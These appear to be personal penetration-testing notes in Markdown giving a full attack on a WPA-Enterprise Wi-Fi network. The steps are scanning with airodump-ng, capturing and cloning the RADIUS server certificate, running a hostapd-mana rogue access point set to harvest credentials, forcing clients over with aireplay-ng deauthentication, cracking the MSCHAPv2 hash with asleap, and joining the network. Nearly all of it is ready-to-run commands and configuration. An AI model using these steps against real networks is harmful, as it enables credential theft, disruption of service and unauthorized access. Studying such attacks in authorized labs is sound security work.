### Setup 

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Identify the network

Identify the network by launching an airodump scan:
```bash
# Look for MGT
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon --wps
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```


### Capture the certificate

Start capture:
```bash
sudo airodump-ng wlan0mon -w /tmp/capture --essid <essid> --bssid <bssid> -c <channel>
```

Deauthenticate client to capture the handshake:
```bash
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC> wlan0mon
sudo aireplay-ng -0 0 -a <BSSID> wlan0mon
sudo aireplay-ng -0 1 -a <BSSID> wlan0mon
```

Open the capture in Wireshark
```bash
wireshark /tmp/capture-01.cap

# Filters
wlan.bssid==<BSSID> && eap && tls.handshake.type == 11
```
![[Pasted image 20250218105025.png]]

For each certificate:
```bash
Right click > Export Packet Bytes > <file>.der
```

Read certificate content:
```bash
openssl x509 -inform der -in cert.der -text
```


### Configure Radius server

```bash
# Install package
sudo apt install freeradius

# Configure certs
sudo su
cd /etc/freeradius/3.0/certs
nano ca.cnf # Modify certificate_authority field to match captured cert
nano server.cnf # Modify server fields to match captured cert

# Generate certs
rm dh
make
make destroycerts # If there are already certs

# Manually generate dh file if make doesn't
sudo openssl dhparam -out /etc/freeradius/3.0/certs/dh 2048
```
>[!info]
>client.crt error is normal


### Configure Rogue AP

```bash
sudo apt install hostapd-mana
```

Configuration file: `/etc/hostapd-mana/mana.conf`
```bash
# SSID of the AP
ssid=Playtronics # CHANGE

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1 # CHANGE
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g # a for 5 GHz

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/output.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

EAP user file: `/etc/hostapd-mana/mana.eap_user`
```bash
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2   "pass"   [2]
```

Start the hostapd-mana server:
```bash
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```


### Deauthenticate

If clients don't automatically connect to our rogue AP, a deauthentication attack may be required:
```bash
# Switch to the appropriate channel
iwconfig wlan0mon channel <channel>
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC> wlan0mon
sudo aireplay-ng -0 0 -a <BSSID> wlan0mon
sudo aireplay-ng -0 1 -a <BSSID> wlan0mon
```


### Crack the hash

Crack the password hash using asleap (command captured from hostapd-mana output)
```bash
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
```


### Connect to the network

Obtain the domain from the wireshark capture:
```bash
tshark -r /tmp/capture-01.cap -Y '(eap) && (eap.identity)' -T fields -e eap.identity
```

Create the connection file:
```bash
network={  
  ssid="<ESSID>"  
  scan_ssid=1  
  key_mgmt=WPA-EAP  
  identity="<DOMAIN>\<USER>"  
  password="<PASSWORD>"  
  eap=PEAP  
  phase1="peaplabel=0"  
  phase2="auth=MSCHAPV2"  
}
```

Connect to the network & request a DHCP IP:
```bash
sudo service NetworkManager start
sudo ifconfig wlan1 up
sudo wpa_supplicant -i wlan1 -c connect.config
sudo dhclient wlan1
```
